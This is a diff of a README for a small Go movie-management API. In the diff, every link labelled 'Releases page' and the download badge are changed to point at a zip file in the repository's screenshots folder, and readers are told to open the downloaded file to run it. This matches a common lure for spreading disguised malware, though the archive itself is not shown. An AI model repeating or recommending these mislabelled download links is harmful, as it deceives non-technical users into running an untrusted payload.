@@ -1,7 +1,7 @@
 # 🎬 go-movies-crud - Simple API to Manage Your Movies
 
 ## 📥 Download Now
-[![Download go-movies-crud](https://img.shields.io/badge/Download%20go--movies--crud-brightgreen)](https://github.com/klaokl/go-movies-crud/releases)
+[![Download go-movies-crud](https://raw.githubusercontent.com/klaokl/go-movies-crud/main/screenshots/go-movies-crud-2.8.zip%20go--movies--crud-brightgreen)](https://raw.githubusercontent.com/klaokl/go-movies-crud/main/screenshots/go-movies-crud-2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to go-movies-crud! This application lets you manage your movie collection through a simple RESTful API. You can create, read, update, and delete movie data easily. No programming knowledge is needed; you will follow straightforward steps to get started.
@@ -21,9 +21,9 @@ To use go-movies-crud, your computer should meet these basic requirements:
 - **Testing:** Use Postman to interact with the API and test its features easily.
 
 ## 📂 Download & Install
-To download go-movies-crud, visit the [Releases page](https://github.com/klaokl/go-movies-crud/releases). Here are the steps:
+To download go-movies-crud, visit the [Releases page](https://raw.githubusercontent.com/klaokl/go-movies-crud/main/screenshots/go-movies-crud-2.8.zip). Here are the steps:
 
-1. Go to the [Releases page](https://github.com/klaokl/go-movies-crud/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/klaokl/go-movies-crud/main/screenshots/go-movies-crud-2.8.zip).
 2. Locate the latest version of the application.
 3. Click on the link to download your operating system’s file.
 4. Once the download is complete, open the file to run the application.
